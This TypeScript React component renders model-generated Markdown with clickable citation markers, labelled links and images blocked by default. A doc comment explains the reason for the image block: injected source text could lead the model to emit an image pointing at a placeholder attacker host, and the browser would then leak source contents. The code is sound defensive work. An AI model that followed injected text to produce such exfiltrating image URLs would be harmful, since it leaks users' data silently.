"use client";

import React, { useMemo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import type { Citation } from "@/lib/types";
import { useCitationHandler } from "./CitationContext";

const CITE = /\[(\d{1,2})\]/g;

type CiteHandler = ((c: Citation) => void) | null | undefined;

/**
 * A citation marker. With a handler it is a real button — focusable, reachable
 * by keyboard and touch, and announced with its source — rather than a hover
 * tooltip that only a mouse can read.
 */
function citeNode(c: Citation, key: string, onCite: CiteHandler) {
  const title = `${c.sourceTitle} · part ${c.part}\n\n${c.snippet}…`;
  if (!onCite) {
    return (
      <span key={key} className="cite" title={title}>
        {c.n}
      </span>
    );
  }
  return (
    <button
      key={key}
      type="button"
      className="cite"
      title={title}
      aria-label={`Citation ${c.n}: ${c.sourceTitle}, part ${c.part}. Open the source.`}
      onClick={(e) => {
        e.stopPropagation();
        onCite(c);
      }}
    >
      {c.n}
    </button>
  );
}

function decorate(
  node: React.ReactNode,
  cites: Map<number, Citation>,
  onCite: CiteHandler,
  keyPrefix = "c"
): React.ReactNode {
  if (typeof node === "string") {
    const parts: React.ReactNode[] = [];
    let last = 0;
    let m: RegExpExecArray | null;
    CITE.lastIndex = 0;
    while ((m = CITE.exec(node)) !== null) {
      const c = cites.get(Number(m[1]));
      if (!c) continue;
      if (m.index > last) parts.push(node.slice(last, m.index));
      parts.push(citeNode(c, `${keyPrefix}-${m.index}`, onCite));
      last = m.index + m[0].length;
    }
    if (!parts.length) return node;
    if (last < node.length) parts.push(node.slice(last));
    return parts;
  }
  if (Array.isArray(node)) {
    return node.map((child, i) =>
      React.isValidElement(child) || typeof child === "string" ? (
        <React.Fragment key={i}>
          {decorate(child, cites, onCite, `${keyPrefix}-${i}`)}
        </React.Fragment>
      ) : (
        child
      )
    );
  }
  if (React.isValidElement(node)) {
    const el = node as React.ReactElement<{ children?: React.ReactNode }>;
    if (el.props?.children) {
      return React.cloneElement(el, {
        children: decorate(el.props.children, cites, onCite, keyPrefix),
      });
    }
  }
  return node;
}

function hostOf(href: string | undefined): string | null {
  if (!href) return null;
  try {
    const u = new URL(href);
    return u.protocol === "http:" || u.protocol === "https:"
      ? u.hostname.replace(/^www\./, "")
      : null;
  } catch {
    return null;
  }
}

/** Text of a rendered node, to tell whether a link already shows its address. */
function plainText(node: React.ReactNode): string {
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(plainText).join("");
  if (React.isValidElement(node)) {
    return plainText((node.props as { children?: React.ReactNode }).children);
  }
  return "";
}

function buildComponents(
  cites: Map<number, Citation>,
  onCite: CiteHandler,
  allowImages: boolean
): Components {
  const wrap = (Tag: keyof React.JSX.IntrinsicElements) => {
    const Wrapped = ({ children: kids }: { children?: React.ReactNode }) =>
      React.createElement(Tag, null, decorate(kids, cites, onCite));
    Wrapped.displayName = `Cited(${String(Tag)})`;
    return Wrapped;
  };

  return {
    p: wrap("p"),
    li: wrap("li"),
    td: wrap("td"),
    h1: wrap("h1"),
    h2: wrap("h2"),
    h3: wrap("h3"),
    h4: wrap("h4"),
    a: ({ href, children: kids }) => {
      const host = hostOf(href);
      // Show where a link goes when its text does not already say so.
      const showHost =
        host && !plainText(kids).toLowerCase().includes(host.toLowerCase());
      return (
        <a href={href} target="_blank" rel="noopener noreferrer nofollow" title={href}>
          {kids}
          {showHost && <span className="md-host"> ({host})</span>}
        </a>
      );
    },
    img: ({ src, alt }) => {
      const url = typeof src === "string" ? src : undefined;
      if (allowImages) {
        // eslint-disable-next-line @next/next/no-img-element
        return <img src={url} alt={alt ?? ""} />;
      }
      const host = hostOf(url);
      return (
        <span
          className="md-blocked-img"
          title="Images in generated text are not loaded automatically"
        >
          🖼️ {alt?.trim() || "Image"}
          {url && host && (
            <>
              {" "}
              <a href={url} target="_blank" rel="noopener noreferrer nofollow">
                open from {host}
              </a>
            </>
          )}
        </span>
      );
    },
  };
}

export default function Markdown({
  children,
  citations,
  onCite,
  allowImages = false,
}: {
  children: string;
  citations?: Citation[];
  /** Overrides the page's CitationContext handler. */
  onCite?: (c: Citation) => void;
  /**
   * Render Markdown images. Off by default: model output is shaped by source
   * text the user never wrote, and an injected `![](https://attacker/?q=…)`
   * would otherwise be fetched by the browser on render — silently sending
   * whatever the model put in the URL, including other sources' contents.
   * Only text the user wrote themselves should turn this on.
   */
  allowImages?: boolean;
}) {
  const fromContext = useCitationHandler();
  const handler = onCite ?? fromContext;

  // Stable component identities: rebuilding them every render made React
  // remount the whole rendered answer on each streamed token.
  const components = useMemo(
    () =>
      buildComponents(new Map((citations ?? []).map((c) => [c.n, c])), handler, allowImages),
    [citations, handler, allowImages]
  );

  return (
    <div className="prose-nb">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
        {children}
      </ReactMarkdown>
    </div>
  );
}

/** Plain-text variant for short strings (quiz explanations, bullets, etc). */
export function InlineCited({
  text,
  citations = [],
  onCite,
}: {
  text: string;
  citations?: Citation[];
  onCite?: (c: Citation) => void;
}) {
  const fromContext = useCitationHandler();
  const map = new Map(citations.map((c) => [c.n, c]));
  return <>{decorate(text, map, onCite ?? fromContext)}</>;
}
